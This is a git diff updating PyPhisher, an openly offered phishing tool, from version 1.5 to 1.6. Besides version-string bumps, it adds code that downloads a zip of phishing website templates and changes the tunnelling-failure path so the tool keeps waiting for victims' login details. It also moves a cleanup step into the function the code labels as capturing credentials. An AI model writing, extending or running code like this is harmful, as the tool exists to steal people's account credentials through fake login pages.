@@ -1,6 +1,6 @@
 # -*- coding: UTF-8 -*-
 # Tool    : PyPhisher
-# Version : 1.5
+# Version : 1.6
 # Author  : KasRoudra
 # Github  : https://github.com/KasRoudra
 # Contact : https://m.me/KasRoudra
@@ -100,7 +100,7 @@ bcyan="\033[1;36m"
 white="\033[0;37m"
 nc="\033[00m"
 
-version="1.5"
+version="1.6"
 
 ask = green + '[' + white + '?' + green + '] '+ yellow
 success = yellow + '[' + white + '√' + yellow + '] '+green
@@ -117,7 +117,7 @@ logo=f'''
 {blue} |  ___/ | | |  ___/| '_ \| / __| '_ \ / _ \ '__|
 {red} | |   | |_| | |    | | | | \__ \ | | |  __/ |   
 {yellow} |_|    \__, |_|    |_| |_|_|___/_| |_|\___|_|   
-{green}         __/ |                          {cyan}[v1.5]
+{green}         __/ |                          {cyan}[v1.6]
 {cyan}        |___/                   {red}[By KasRoudra]
 '''
 
@@ -320,7 +320,7 @@ def about():
     system("clear")
     slowprint(logo)
     print(red+'[ToolName]  '+cyan+' :[PyPhisher] ')
-    print(red+'[Version]   '+cyan+' :[1.5]')
+    print(red+'[Version]   '+cyan+' :[1.6]')
     print(red+'[Author]    '+cyan+' :[KasRoudra] ')
     print(red+'[Github]    '+cyan+' :[https://github.com/KasRoudra] ')
     print(red+'[Messenger] '+cyan+' :[https://m.me/KasRoudra]')
@@ -750,10 +750,20 @@ def customfol():
 
 # 2nd function checking requirements and download files 
 def requirements(folder,mask):
+    if os.path.isfile(root+"/.websites/version.txt"):
+        with open(root+"/.websites/version.txt", "r") as inform2:
+            zipver=inform2.read().strip()
+            if zipver!=version:
+                sprint("\n"+info+"Downloading required files.....\n")
+                system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/websites.zip -O websites.zip")
+    else:
+        sprint("\n"+info+"Downloading required files.....\n")
+        system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/websites.zip -O websites.zip")
     if os.path.isfile("websites.zip"):
         system("rm -rf $HOME/.websites && cd $HOME && mkdir .websites")
         system("unzip websites.zip -d $HOME/.websites > /dev/null 2>&1")
         os.remove("websites.zip")
+    
     while True:
         if os.path.exists(root+"/.websites/"+folder):
             system("cp -r $HOME/.websites/"+folder+"/* $HOME/.site")
@@ -832,9 +842,9 @@ def server():
             cuask(ngroklink)
             break
         elif not (cfcheck and ngrokcheck):
-            sprint("\n"+error+"Tunneling falied!"+nc)
-            killer()
-            exit()
+            sprint("\n"+error+"Tunneling failed! Use your own tunneling service on port 8080!"+nc)
+            waiter()
+            break
         else:
             sprint("\n"+error+"Unknown error!")
             killer()
@@ -897,7 +907,6 @@ def masking(url):
 def url_manager(url,num1,num2):
     internet()
     sprint("\n"+success+"Your urls are given below: \n")
-    system("rm -rf $HOME/.site/ip.txt")
     print(info2+"URL "+num1+" > "+yellow+url)
     if os.path.isfile(root+"/.site/.info.txt"):
         with open(root+"/.site/.info.txt", "r") as inform:
@@ -907,6 +916,7 @@ def url_manager(url,num1,num2):
 
 # Last function capturing credentials
 def waiter():
+    system("rm -rf $HOME/.site/ip.txt")
     sprint("\n"+info+blue+"Waiting for login info...."+cyan+"Press "+red+"Ctrl+C"+cyan+" to exit")
     try:
         while True:
